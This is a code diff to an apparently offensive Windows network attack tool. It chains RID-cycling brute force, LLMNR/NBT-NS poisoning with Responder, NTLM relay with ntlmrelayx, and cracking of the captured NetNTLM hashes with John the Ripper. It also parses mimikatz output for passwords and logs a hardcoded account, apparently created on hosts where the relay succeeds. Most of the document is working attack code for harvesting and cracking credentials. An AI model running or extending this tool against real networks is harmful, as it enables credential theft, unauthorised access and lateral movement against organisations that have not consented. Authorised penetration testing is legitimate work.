@@ -22,7 +22,7 @@ from libnmap.parser import NmapParser, NmapParserException
 os.environ['CPUID_DISABLE'] = '1'
 
 # debug
-from IPython import embed
+#from IPython import embed
 
 def parse_args():
     # Create the arguments
@@ -500,13 +500,12 @@ def create_john_cmd(hash_format, hash_file):
     john_cmd = ' '.join(cmd)
     return john_cmd
 
-def crack_resp_hashes(hashes):
+def crack_hashes(hashes, identifier):
     '''
-    Crack responder-found hashes with john
+    Crack hashes with john
     The hashes in the func args include usernames, domains, and such
     '''
     procs = []
-    identifier = ''.join(random.choice(string.ascii_letters) for x in range(5))
 
     if len(hashes) > 0:
         # hashes = {'NTLMv1':['user:DOM:host:hash'], 'NTLMv2':['user:DOM:host:hash']}
@@ -519,7 +518,11 @@ def crack_resp_hashes(hashes):
             elif 'v2' in hash_type:
                 hash_format = 'netntlmv2'
             john_cmd = create_john_cmd(hash_format, filename)
-            john_proc = run_proc(john_cmd)
+            try:
+                john_proc = run_proc(john_cmd)
+            except FileNotFoundError:
+                print('[-] Error running john for password cracking, \
+                       try: cd submodules/JohnTheRipper/src && ./configure && make')
             procs.append(john_proc)
 
     return procs
@@ -546,31 +549,6 @@ def get_cracked_pwds(prev_pwds):
                         user_pw = {host:[user_pw_str]}
                         log_pwds(user_pw)
     return prev_pwds
-
-def check_avx2_bug(cmd, run_already):
-    '''
-    JTR's configure script has a bug in VMware Workstation where it thinks AVX2 is in CPU flags
-    Fix is to run 'export CPUID_DISABLE=1'
-    '''
-    out = None
-    try:
-        out = check_output('submodules/JohnTheRipper/run/john')
-    except CalledProcessError as e:
-        if out:
-            if 'AVX2' in out:
-                os.environ['CPUID_DISABLE'] = '1'
-                # Prevent infinite loop if JTR complains about avx2 again
-                if run_already == False:
-                    run_jtr(cmd, True)
-                else:
-                    print('[-] Error running JohnTheRipper: '+out)
-                    return
-            else:
-                print('[-] Error running JohnTheRipper: '+out)
-                return
-        else:
-            print('[-] Error running JohnTheRipper: '+e)
-            return
 
 def start_responder_llmnr():
     '''
@@ -625,22 +603,6 @@ def check_ntlmrelay_error(line, file_lines):
         return True
     else:
         return False
-
-def get_ntlmrelay_hashes(line):
-    '''
-    Parses ntlmrelayx output for hashes
-    '''
-    version, ntlm_hash = (None, None)
-    if line.count(':') == 4:
-        version = 'v2'
-        ntlm_hash = line.strip()
-        return (version, ntlm_hash)
-    elif line.count(':') == 5:
-        version = 'v1'
-        ntlm_hash = line.strip()
-        return (version, ntlm_hash)
-    else:
-        return (version, ntlm_hash)
 
 def format_mimi_data(dom, user, auth, hash_or_pw, prev_hashes, prev_pwds):
     user_pw = user+':'+auth
@@ -697,7 +659,7 @@ def parse_mimikatz(prev_pwds, prev_hashes, mimi_data, line):
 
     return prev_pwds, prev_hashes, mimi_data
 
-def get_and_crack_resp_hashes(args, prev_hashes, prev_pwds, prev_lines):
+def get_and_crack_resp_hashes(args, prev_hashes, prev_pwds, prev_lines, identifier):
     '''
     Gets and cracks responder hashes
     Avoids getting and cracking previous hashes
@@ -705,7 +667,7 @@ def get_and_crack_resp_hashes(args, prev_hashes, prev_pwds, prev_lines):
     new_lines = []
     if 'john' not in args.skip:
         prev_hashes, hashes = get_resp_hashes(prev_hashes)
-        john_proc = crack_resp_hashes(hashes)
+        john_proc = crack_hashes(hashes, identifier)
         prev_pwds = get_cracked_pwds(prev_pwds)
 
     # Print responder-session.log output so we know it's running
@@ -722,53 +684,101 @@ def get_and_crack_resp_hashes(args, prev_hashes, prev_pwds, prev_lines):
 
     return prev_hashes, prev_pwds, new_lines
 
-def signal_handler(signal, frame):
-    '''
-    Catch CTRL-C and kill procs
-    '''
-    print('\n[-] CTRL-C caught, cleaning up and closing')
 
-    try:
-        cleanup_resp(resp_proc)
-        ntlmrelay_proc.kill()
-    except NameError:
-        pass
-
-    # Cleanup hash files
-    ntlm_files = []
-    for fname in os.listdir(os.getcwd()):
-        if re.search('NTLMv(1|2)-hashes-.*\.txt', fname):
-            ntlm_files.append(fname)
-
-    for fname in ntlm_files:
-        if 'v1' in fname:
-            v1_file = open('NTLMv1-hashes.txt', 'a+')
-            with open(fname) as infile1:
-                v1_file.write(infile1.read())
-                os.rename(fname, 'logs/'+fname)
-        elif 'v2' in fname:
-            with open(fname) as infile2:
-                v2_file = open('NTLMv2-hashes.txt', 'a+')
-                v2_file.write(infile2.read())
-                os.rename(fname, 'logs/'+fname)
-    sys.exit()
-
-def cleanup_resp(resp_proc):
+def cleanup_resp(resp_proc, prev_pwds):
     '''
     Kill responder and move the log file
     '''
+    ####111111 Add a john check for all the NTLM
     resp_proc.kill()
     path = 'submodules/Responder/logs/Responder-Session.log'
     timestamp = str(time.time())
     os.rename(path, path+'-'+timestamp)
-    print('CLEANUP RESP WORKED') ########11111111111
+    prev_pwds = get_cracked_pwds(prev_pwds)
+    return prev_pwds
 
-def do_ntlmrelay(prev_hashes, prev_pwds):
+def parse_ntlmrelay_line(identifier, line, successful_auth, prev_hashes):
+    '''
+    Parses ntlmrelayx.py's output
+    '''
+    hashes = {}
+    # check for errors
+    if line.startswith('  ') or line.startswith('Traceback') or line.startswith('ERROR'):
+        # First few lines of mimikatz logo start with '   ' and have #### in them
+        if '####' not in line:
+            print(line.strip())
+
+    # ntlmrelayx output
+    if re.search('\[.\]', line):
+        print('    '+line.strip())
+
+    # Only try to crack successful auth hashes
+    if successful_auth == True:
+        successful_auth = False
+        netntlm_hash = line.split()[-1]+'\n'
+        if netntlm_hash.count(':') == 5:
+            hash_type = 'NTLMv2'
+            if netntlm_hash not in prev_hashes:
+                prev_hashes.append(netntlm_hash)
+                hashes['NTLMv2'] = [netntlm_hash]
+        if netntlm_hash.count(':') == 4:
+            hash_type = 'NTLMv1'
+            if netntlm_hash not in prev_hashes:
+                prev_hashes.append(netntlm_hash)
+                hashes['NTLMv1'] = [netntlm_hash]
+
+        if len(hashes) > 0:
+            john_procs = crack_hashes(hashes, identifier)
+
+    if successful_auth == False:
+        if ' SUCCEED' in line:
+            successful_auth = True
+
+    if 'Executed specified command on host' in line:
+        ip = line.split()[-1]
+        log_pwds({ip:['icebreaker:P@ssword123456']})
+    return prev_hashes, successful_auth
+
+def do_ntlmrelay(identifier, prev_hashes, prev_pwds):
     '''
     Continuously monitor and parse ntlmrelay output
     '''
     print('[*] Attack 3: NTLM relay')
     resp_proc, ntlmrelay_proc = run_relay_attack()
+
+    def signal_handler(signal, frame):
+        '''
+        Catch CTRL-C and kill procs
+        '''
+        print('\n[-] CTRL-C caught, cleaning up and closing')
+
+        print('111111111')
+        try:
+            print('222222222')
+            cleanup_resp(resp_proc, prev_pwds)
+            ntlmrelay_proc.kill()
+        except NameError:
+            raise
+
+        print('33333333')
+        # Cleanup hash files
+        ntlm_files = []
+        for fname in os.listdir(os.getcwd()):
+            if re.search('NTLMv(1|2)-hashes-.*\.txt', fname):
+                ntlm_files.append(fname)
+
+        for fname in ntlm_files:
+            if 'v1' in fname:
+                v1_file = open('NTLMv1-hashes.txt', 'a+')
+                with open(fname) as infile1:
+                    v1_file.write(infile1.read())
+                    os.rename(fname, 'logs/'+fname)
+            elif 'v2' in fname:
+                with open(fname) as infile2:
+                    v2_file = open('NTLMv2-hashes.txt', 'a+')
+                    v2_file.write(infile2.read())
+                    os.rename(fname, 'logs/'+fname)
+        sys.exit()
 
     # CTRL-C handler
     signal.signal(signal.SIGINT, signal_handler)
@@ -779,30 +789,10 @@ def do_ntlmrelay(prev_hashes, prev_pwds):
     file_lines = follow_file(ntlmrelay_file)
     successful_auth = False
     for line in file_lines:
-
-        # check for errors
-        if line.startswith('  ') or line.startswith('Traceback') or line.startswith('ERROR'):
-            # First few lines of mimikatz logo start with '   ' and have #### in them
-            if '####' not in line:
-                print(line.strip())
-
-        # ntlmrelayx output
-        if re.search('\[.\]', line):
-            print('    '+line.strip())
-        if successful_auth == False:
-            if ' SUCCEED' in line:
-                successful_auth = True
-        if successful_auth == True:
-            successful_auth = False
-            # NTLMv2
-            netntlm_hash = line.split()[-1]
-            if netntlm_hash.count(':') > 3:
-                if netntlm_hash not in prev_hashes:
-                    prev_hashes.append(ntlmv2_hash)
-
-        # Parse mimikatz
+        # Parse ntlmrelay output
+        prev_hashes, successful_auth = parse_ntlmrelay_line(identifier, line, successful_auth, prev_hashes)
+        # Parse mimikatz output
         prev_pwds, prev_hashes, mimi_data = parse_mimikatz(prev_pwds, prev_hashes, mimi_data, line)
-
 
 def main(report, args):
     '''
@@ -822,6 +812,7 @@ def main(report, args):
         for host in smb_signing_disabled_hosts:
             write_to_file('smb-signing-disabled-hosts.txt', host+'\n')
 
+        # ATTACK 1: RID Cycling into reverse bruteforce
         if 'ridenum' not in args.skip.lower():
             print('[*] Attack 1: RID cycling in null SMB sessions into reverse bruteforce')
             users_pws = smb_reverse_brute(loop, hosts, args)
@@ -830,6 +821,7 @@ def main(report, args):
 
 
     # ATTACK 2: LLMNR poisoning
+    identifier = ''.join(random.choice(string.ascii_letters) for x in range(5))
     if 'responder' not in args.skip.lower():
         print('[*] Attack 2: LLMNR/NBTS/mDNS poisoning for NTLM hashes')
         prev_lines = []
@@ -840,17 +832,18 @@ def main(report, args):
         timeout = time.time() + 60 * 10
         try:
             while time.time() < timeout:
-                prev_hashes, prev_pwds, new_lines = get_and_crack_resp_hashes(args, prev_hashes, prev_pwds, prev_lines)
+                prev_hashes, prev_pwds, new_lines = get_and_crack_resp_hashes(args, prev_hashes, prev_pwds, prev_lines, identifier)
                 prev_lines += new_lines
+            prev_pwds = cleanup_resp(resp_proc, prev_pwds)
         except KeyboardInterrupt:
             print('\n[-] Killing Responder.py and moving on')
-            resp_proc.kill()
-            # Give responder some time to die
-            time.sleep(3)
+            prev_pwds = cleanup_resp(resp_proc, prev_pwds)
+            # Give responder some time to die with dignity
+            time.sleep(2)
 
     # ATTACK 3: NTLM relay
     if 'relay' not in args.skip.lower() and len(hosts) > 0:
-        do_ntlmrelay(prev_pwds, prev_hashes)
+        do_ntlmrelay(identifier, prev_hashes, prev_pwds)
     elif len(hosts) == 0:
         sys.exit('[-] No SMB hosts to attack with ntlmrelay')
 
@@ -865,11 +858,8 @@ if __name__ == "__main__":
 
 # WHERE I LEFT OFF
     # TO DO
-    # create crack_relay_hashes
     # Also figure out whether ridenum from github needs python2 or 3
     # add jenkins/websphere deserialization
     # why does john not crack the hashes responder captured on marcello's network; check phone pictures for paste
-    # check netlmrelay output for succeeeded command and add icebreaker:password to found-passwords
-    #   [*] Executed specified command on host: 192.168.10.22
     # quick 2 password bruteforce on repsonder usernames
 
